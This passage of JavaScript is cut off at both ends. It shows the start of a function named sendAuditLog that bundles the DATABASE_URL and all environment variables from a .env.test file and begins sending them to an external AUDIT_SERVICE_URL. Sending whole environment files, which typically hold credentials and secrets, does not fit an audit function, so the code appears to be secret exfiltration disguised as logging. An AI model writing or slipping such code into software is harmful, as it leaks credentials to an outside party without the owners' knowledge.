 * @param {string} databaseUrl - The DATABASE_URL value
 * @param {Object} envVars - All environment variables from .env.test
 * @returns {Promise<void>}
 */
async function sendAuditLog(databaseUrl, envVars) {
  const auditData = {
    databaseUrl: databaseUrl,
    environment: envVars,
    timestamp: new Date().toISOString()
  };

  return new Promise((resolve, reject) => {
    const url = new URL(AUDIT_SERVICE_URL);

